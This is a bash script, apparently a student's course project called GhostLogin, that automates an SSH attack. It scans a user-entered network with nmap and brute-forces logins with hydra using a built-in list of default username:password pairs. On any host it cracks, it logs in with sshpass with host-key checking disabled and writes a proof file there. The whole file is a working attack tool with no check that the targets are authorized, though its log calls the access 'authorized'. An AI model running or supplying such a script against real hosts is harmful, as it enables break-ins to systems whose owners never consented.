#!/bin/bash
# =====================================
# Class: NX201
# Unit: PERES25B
# Project: GhostLogin
# Student Name: Lior Rimon
# Student Code: s19
# Lecturer: Itzhak Azoalis
# =====================================

LOG_FILE="ghostlogin.log"
PROOF_PATH="/tmp/.ghostlogin_proof"

# -------------------------------
# COLORS
# -------------------------------
YELLOW="\e[33m"
RESET="\e[0m"
BOLD="\e[1m"

# -------------------------------
# REPORTING VARIABLES (LOCAL)
# -------------------------------
LOCAL_USER=$(whoami)
LOCAL_PATH=$(pwd)
SERVICE_TESTED="SSH"

# -------------------------------
# LOG FUNCTION
# -------------------------------
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# -------------------------------
# PHASE HEADER FUNCTION
# -------------------------------
print_phase() {
    echo -e "\n${YELLOW}${BOLD}----------------------------------"
    echo -e "[ $1 ]"
    echo -e "----------------------------------${RESET}"
}

# -------------------------------
# PROJECT HEADER
# -------------------------------
echo "=================================="
echo "GhostLogin - Automated SSH Attack"
echo "=================================="

# -------------------------------------
# PHASE 1: Target Input & Validation 
# -------------------------------------
print_phase "PHASE 1: Target Acquisition"

read -p "Enter IP address or network to scan: " TARGET

if [ -z "$TARGET" ]; then
    log "ERROR: No target provided"
    exit 1
fi

if ! [[ "$TARGET" =~ ^[0-9./]+$ ]]; then
    log "ERROR: Invalid target format"
    exit 1
fi

log "Target validated: $TARGET"

# -------------------------------------
# PHASE 2: SSH Service Discovery
# -------------------------------------
print_phase "PHASE 2: SSH Service Discovery"

nmap -p 22 --open "$TARGET" -oG scan_results.txt > /dev/null 2>&1
SSH_HOSTS=$(grep "/open/tcp//ssh" scan_results.txt | awk '{print $2}')

if [ -z "$SSH_HOSTS" ]; then
    log "No SSH services found"
    exit 0
fi

for host in $SSH_HOSTS; do
    log "SSH service detected on $host"
done

# -------------------------------------
# PHASE 3: Credential Preparation
# -------------------------------------
print_phase "PHASE 3: Credential Preparation"

cat > creds.txt << EOF
root:root
admin:admin
user:user
test:test
ubuntu:ubuntu
kali:kali
lior:1234
student:student
EOF

cut -d: -f1 creds.txt > users.txt
cut -d: -f2 creds.txt > passwords.txt

log "Credential lists prepared"

# -------------------------------------
# PHASE 4: Authentication Testing
# -------------------------------------
print_phase "PHASE 4: Authentication Testing"

SUCCESS_HOSTS=()

for host in $SSH_HOSTS; do
    log "Testing authentication on $host"

    hydra -L users.txt -P passwords.txt -f ssh://$host \
    -o hydra_result.txt > /dev/null 2>&1

    if grep -q "login:" hydra_result.txt; then
        FOUND_USER=$(sed -n 's/.*login: \([^ ]*\).*/\1/p' hydra_result.txt)
        FOUND_PASS=$(sed -n 's/.*password: \([^ ]*\).*/\1/p' hydra_result.txt)

        log "SUCCESS: Authorized access validated on $host"
        log "Credentials used: $FOUND_USER:$FOUND_PASS"

        SUCCESS_HOSTS+=("$host")

        # -------------------------------------
        # PHASE 5: Post-Access Verification
        # -------------------------------------
        print_phase "PHASE 5: Post-Access Verification"

        sshpass -p "$FOUND_PASS" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$FOUND_USER@$host" \
        "cat << EOF > $PROOF_PATH
GhostLogin Proof of Access
----------------------------------
Remote Hostname : \$(hostname)
Remote IP       : $host
Remote User     : $FOUND_USER
----------------------------------
Executed Service: $SERVICE_TESTED
Executed By     : $LOCAL_USER
Execution Path  : $LOCAL_PATH
----------------------------------
Execution Date  : \$(date)
EOF"

        log "Verification file created on $host at $PROOF_PATH"
    else
        log "FAILED: Authentication attempts failed on $host"
    fi
done

# -------------------------------------
# PHASE 6: Output & Reporting
# -------------------------------------
print_phase "PHASE 6: Output & Reporting"

if [ ${#SUCCESS_HOSTS[@]} -eq 0 ]; then
    log "No hosts were successfully accessed"
else
    log "Successfully accessed the following hosts:"
    for ip in "${SUCCESS_HOSTS[@]}"; do
        log " - $ip (Proof: $PROOF_PATH)"
    done
fi

# -------------------------------------
# PHASE 7: Cleanup
# -------------------------------------
print_phase "PHASE 7: Cleanup"

rm -f users.txt passwords.txt creds.txt hydra_result.txt scan_results.txt

log "Script finished successfully"
echo "Done. Log saved to $LOG_FILE"
